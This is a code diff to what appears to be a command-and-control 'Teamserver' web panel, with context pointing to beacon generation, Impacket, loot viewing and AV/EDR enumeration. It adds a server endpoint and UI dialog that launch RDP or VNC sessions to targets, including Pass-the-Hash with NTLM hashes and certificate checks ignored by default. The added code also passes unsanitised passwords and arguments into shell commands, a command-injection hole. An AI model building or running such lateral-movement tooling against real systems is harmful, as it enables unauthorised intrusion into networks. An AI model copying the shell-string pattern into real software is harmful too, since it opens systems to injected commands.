@@ -734,6 +734,92 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         t.start()
         return jsonify({"status": "started", "target": target})
 
+    # ── Remote Desktop (xfreerdp / VNC viewer) — runs on Teamserver ──
+
+    @app.route("/api/server/rdp", methods=["POST"])
+    @require_auth
+    def api_server_rdp():
+        body = request.get_json(silent=True) or {}
+        target = body.get("target", "").strip()
+        mode = body.get("mode", "xfreerdp")
+        username = body.get("username", "").strip()
+        password = body.get("password", "").strip()
+        domain = body.get("domain", ".").strip()
+        use_hash = body.get("use_hash", False)
+        port = body.get("port", "")
+        fullscreen = body.get("fullscreen", False)
+        ignore_cert = body.get("ignore_cert", True)
+
+        if not target:
+            return jsonify({"error": "target required"}), 400
+
+        if mode == "xfreerdp":
+            cmd_parts = ["xfreerdp"]
+            cmd_parts.append(f"/v:{target}")
+            if port:
+                cmd_parts.append(f"/port:{port}")
+            if domain and domain != ".":
+                cmd_parts.append(f"/d:{domain}")
+            if username:
+                cmd_parts.append(f"/u:{username}")
+            if use_hash and password:
+                cmd_parts.append(f"/pth:{password}")
+            elif password:
+                cmd_parts.append(f"/p:{password}")
+            if fullscreen:
+                cmd_parts.append("/f")
+            else:
+                cmd_parts.append("/dynamic-resolution")
+            if ignore_cert:
+                cmd_parts.append("/cert-ignore")
+            cmd_parts.append("/sec:nla")
+            cmd_parts.append("+clipboard")
+            cmd_str = " ".join(cmd_parts)
+
+        elif mode == "vnc":
+            cmd_parts = []
+            vnc_target = f"{target}:{port}" if port else target
+            for viewer in ("vncviewer", "xvncviewer", "tigervnc", "xtigervncviewer"):
+                if subprocess.run(["which", viewer], capture_output=True).returncode == 0:
+                    cmd_parts = [viewer, vnc_target]
+                    if password:
+                        pass_file = f"/tmp/.vnc_pass_{secrets.token_hex(4)}"
+                        subprocess.run(
+                            ["bash", "-c", f"echo '{password}' | vncpasswd -f > {pass_file}"],
+                            capture_output=True, timeout=5,
+                        )
+                        cmd_parts.extend(["-passwd", pass_file])
+                    if fullscreen:
+                        cmd_parts.append("-fullscreen")
+                    break
+            if not cmd_parts:
+                return jsonify({"error": "No VNC viewer found (install tigervnc-viewer or tightvncviewer)"}), 400
+            cmd_str = " ".join(cmd_parts)
+
+        else:
+            return jsonify({"error": f"Unknown mode: {mode}"}), 400
+
+        _log_event("TOOL", f"RDP/VNC session: {mode} → {target} (user={username or 'none'})")
+
+        def _launch_rdp():
+            try:
+                subprocess.Popen(
+                    cmd_str, shell=True,
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    start_new_session=True,
+                )
+            except Exception as e:
+                logger.error("Failed to launch %s: %s", mode, e)
+
+        t = threading.Thread(target=_launch_rdp, daemon=True)
+        t.start()
+        return jsonify({
+            "status": "launched",
+            "mode": mode,
+            "target": target,
+            "cmd": cmd_str,
+        })
+
     # ── Beacon generator (obfuscated one-liner) ──
 
     @app.route("/api/server/beacon-gen", methods=["POST"])
@@ -2869,6 +2955,7 @@ async function renderAgentView(id){
         <button onclick="showBeaconConfig()"><span class="ico">&#9881;</span> Beacon</button>
         <button onclick="showPivotMap()"><span class="ico">&#127760;</span> Pivot Map</button>
         <button onclick="showImpacketMenu(this)"><span class="ico">&#9876;</span> Impacket</button>
+        <button onclick="showRdpDialog()"><span class="ico">&#128424;</span> RDP/VNC</button>
         <button onclick="showLootViewer()"><span class="ico">&#128142;</span> Loot</button>
         <button onclick="showAgentLog()"><span class="ico">&#128196;</span> Agent Log</button>
         <button onclick="showHelp()"><span class="ico">&#10067;</span> Help</button>
@@ -3399,6 +3486,62 @@ async function runAvEnumRemote(){
   openPanel("AV/EDR: "+target, '<div class="t-pending">Enumerating endpoint protection on '+esc(target)+'...</div>');
   if(panelPollTimer) clearInterval(panelPollTimer);
   panelPollTimer = setInterval(() => pollServerExec("avenum"), 2000);
+}
+
+// ── RDP / VNC dialog (runs on Teamserver, opens window) ──
+function showRdpDialog(){
+  document.getElementById("ipk-menu")?.remove();
+  document.getElementById("nxc-menu")?.remove();
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.style.minWidth = "380px";
+  panel.innerHTML = '<h2>&#128424; Remote Desktop / VNC</h2>'
+    +'<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">&#10005;</button>'
+    +'<p style="font-size:11px;color:var(--text2);margin:0 0 12px">Launches xfreerdp or VNC viewer on the Teamserver. Supports Pass-the-Hash via xfreerdp /pth flag.</p>'
+    +'<div class="avenum-form">'
+    +'<label>Mode <select id="rdp-mode" style="padding:6px 8px;background:var(--bg2);color:var(--text);border:1px solid var(--border);border-radius:4px;font-size:12px">'
+    +'<option value="xfreerdp">xfreerdp (RDP + Pass-the-Hash)</option>'
+    +'<option value="vnc">VNC Viewer</option>'
+    +'</select></label>'
+    +'<label>Target <input id="rdp-target" placeholder="10.0.0.5"></label>'
+    +'<label>Port <input id="rdp-port" placeholder="3389 (RDP) / 5900 (VNC)"></label>'
+    +'<label>Domain <input id="rdp-domain" placeholder="." value="."></label>'
+    +'<label>Username <input id="rdp-user" placeholder="Administrator"></label>'
+    +'<label>Password / NTLM Hash <input id="rdp-pass" type="password" placeholder="password or aad3b435b51404eeaad3b435b51404ee:hash"></label>'
+    +'<label class="ave-check"><input type="checkbox" id="rdp-hash"> Pass-the-Hash (NTLM)</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rdp-fullscreen"> Fullscreen</label>'
+    +'<label class="ave-check"><input type="checkbox" id="rdp-cert" checked> Ignore certificate warnings</label>'
+    +'<button class="ave-run" onclick="launchRdpSession()">&#128424; Connect</button>'
+    +'</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+}
+
+async function launchRdpSession(){
+  const target = document.getElementById("rdp-target")?.value?.trim();
+  if(!target){ toast("warn","RDP/VNC","Enter target IP/hostname",3000); return; }
+  const mode = document.getElementById("rdp-mode")?.value || "xfreerdp";
+  const port = document.getElementById("rdp-port")?.value?.trim() || "";
+  const domain = document.getElementById("rdp-domain")?.value?.trim() || ".";
+  const user = document.getElementById("rdp-user")?.value?.trim() || "";
+  const pass = document.getElementById("rdp-pass")?.value || "";
+  const useHash = document.getElementById("rdp-hash")?.checked || false;
+  const fullscreen = document.getElementById("rdp-fullscreen")?.checked || false;
+  const ignoreCert = document.getElementById("rdp-cert")?.checked || true;
+  document.querySelector(".loot-overlay")?.remove();
+  toast("info","RDP/VNC","Launching "+mode+" to "+target+"...",4000);
+  const resp = await api("/api/server/rdp", {
+    method:"POST",
+    body:JSON.stringify({target, mode, username:user, password:pass, domain, use_hash:useHash, port, fullscreen, ignore_cert:ignoreCert})
+  });
+  if(resp && resp.status === "launched"){
+    toast("ok","RDP/VNC","Window opened: "+mode+" → "+target,5000);
+  } else if(resp && resp.error){
+    toast("error","RDP/VNC",resp.error,6000);
+  }
 }
 
 // ── RelayKing dialog ──
